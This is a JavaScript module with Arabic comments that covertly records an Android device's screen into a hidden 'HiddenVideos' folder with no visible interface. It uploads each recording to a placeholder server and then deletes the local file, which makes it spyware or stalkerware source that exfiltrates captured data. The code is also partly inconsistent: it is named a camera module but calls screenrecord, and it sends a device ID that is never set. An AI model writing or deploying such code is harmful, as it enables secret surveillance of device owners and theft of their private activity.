const { exec } = require('child_process');
const fs = require('fs');
const path = require('path');

class CameraModule {
  constructor() {
    this.isRecording = false;
    this.outputDir = '/sdcard/DCIM/HiddenVideos';
  }

  async startRecording(duration = 30) {
    if (this.isRecording) return;
    
    try {
      // إنشاء مجلد تخزين مخفي
      if (!fs.existsSync(this.outputDir)) {
        fs.mkdirSync(this.outputDir, { recursive: true });
      }
      
      const outputPath = path.join(
        this.outputDir, 
        `recording_${Date.now()}.mp4`
      );
      
      // بدء التسجيل بدون واجهة
      this.recordingProcess = exec(
        `screenrecord --verbose --time-limit ${duration} ${outputPath}`,
        { stdio: 'ignore' }
      );
      
      this.isRecording = true;
      console.log('بدأ تسجيل الفيديو');
      
      // التوقف التلقائي بعد المدة المحددة
      setTimeout(() => {
        this.stopRecording(outputPath);
      }, duration * 1000);
      
      return true;
    } catch (error) {
      console.error('فشل في بدء التسجيل:', error);
      return false;
    }
  }

  stopRecording(outputPath) {
    if (!this.isRecording) return;
    
    try {
      // إرسال إشارة التوقف للتسجيل
      this.recordingProcess.kill('SIGINT');
      
      // الانتظار لحفظ الملف
      setTimeout(() => {
        if (fs.existsSync(outputPath)) {
          console.log('تم حفظ الفيديو:', outputPath);
          this.uploadVideo(outputPath);
        }
        this.isRecording = false;
      }, 3000);
    } catch (error) {
      console.error('فشل في إيقاف التسجيل:', error);
      this.isRecording = false;
    }
  }

  async uploadVideo(filePath) {
    try {
      const formData = new FormData();
      formData.append('deviceId', this.deviceId);
      formData.append('file', fs.createReadStream(filePath));
      
      const response = await fetch('https://your-server.com/upload-video', {
        method: 'POST',
        body: formData
      });
      
      if (response.ok) {
        console.log('تم رفع الفيديو بنجاح');
        fs.unlinkSync(filePath);
      }
    } catch (error) {
      console.error('فشل في رفع الفيديو:', error);
    }
  }
}

module.exports = CameraModule;